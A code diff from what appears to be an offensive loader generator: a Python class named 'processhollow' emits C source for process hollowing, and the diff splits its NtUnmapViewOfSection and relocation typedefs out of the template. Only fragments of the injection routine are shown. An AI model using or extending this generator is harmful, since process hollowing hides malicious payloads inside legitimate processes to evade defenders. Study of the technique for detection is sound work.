@@ -21,25 +21,24 @@ class processhollow:
     def compilerOptions(self) -> list[str]:
         return []
 
-    def template(self) -> str:
-        return Template("""
-{imports}
-
+    def codeblocks(self) -> str:
+        return """
 typedef NTSTATUS(WINAPI* _NtUnmapViewOfSectionFunc)(HANDLE ProcessHandle, PVOID BaseAddress);
 
-typedef struct RELOCATION_BLOCK {{
+typedef struct RELOCATION_BLOCK {
 	DWORD PageAddress;
 	DWORD BlockSize;
-}} RELOCATION_BLOCK, * PRELOCATION_BLOCK;
+} RELOCATION_BLOCK, * PRELOCATION_BLOCK;
 
-typedef struct RELOCATION_ENTRY {{
+typedef struct RELOCATION_ENTRY {
 	USHORT Offset : 12;
 	USHORT Type : 4;
-}} RELOCATION_ENTRY, * PRELOCATION_ENTRY;
+} RELOCATION_ENTRY, * PRELOCATION_ENTRY;
 
-{codeblocks}
+"""
 
-int main(void) {{
+    def template(self) -> str:
+        return Template("""
 
     {transformers}
 
@@ -204,7 +203,5 @@ int main(void) {{
 	}}
 
 	printf("[+] Process Hollowing Technique Done");
-	return 0;
 
-}}
 """).substitute(target=self.target, memoryPermission=self.memoryPermission)
